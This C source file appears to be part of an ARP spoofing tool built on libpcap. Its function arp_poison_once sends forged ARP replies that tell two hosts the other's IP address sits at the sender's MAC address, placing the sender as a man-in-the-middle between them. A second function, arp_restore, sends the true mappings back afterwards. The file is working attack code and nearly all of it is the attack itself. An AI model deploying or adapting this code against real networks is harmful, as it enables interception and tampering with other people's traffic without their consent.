#include <unistd.h>
#include "arp_poison.h"
#include "arp_packet.h"

int	arp_poison_once(pcap_t *handle, const poison_targets_t *t)
{
	unsigned char	frame[ARP_FRAME_LEN];
	int		rc;

	rc = 0;
	/* Tell A: "B's IP is at our MAC" */
	build_arp_reply(frame, sizeof(frame), t->mac_a, t->our_mac,
			t->our_mac, t->ip_b, t->mac_a, t->ip_a);
	if (pcap_sendpacket(handle, frame, ARP_FRAME_LEN) != 0)
		rc = -1;

	/* Tell B: "A's IP is at our MAC" */
	build_arp_reply(frame, sizeof(frame), t->mac_b, t->our_mac,
			t->our_mac, t->ip_a, t->mac_b, t->ip_b);
	if (pcap_sendpacket(handle, frame, ARP_FRAME_LEN) != 0)
		rc = -1;
	return (rc);
}

void	arp_restore(pcap_t *handle, const poison_targets_t *t, int repeats)
{
	unsigned char	frame[ARP_FRAME_LEN];
	int		i;

	for (i = 0; i < repeats; i++)
	{
		/* Tell A the truth: "B's IP is at B's real MAC" */
		build_arp_reply(frame, sizeof(frame), t->mac_a, t->mac_b,
				t->mac_b, t->ip_b, t->mac_a, t->ip_a);
		pcap_sendpacket(handle, frame, ARP_FRAME_LEN);

		/* Tell B the truth: "A's IP is at A's real MAC" */
		build_arp_reply(frame, sizeof(frame), t->mac_b, t->mac_a,
				t->mac_a, t->ip_a, t->mac_b, t->ip_b);
		pcap_sendpacket(handle, frame, ARP_FRAME_LEN);

		usleep(200000);
	}
}
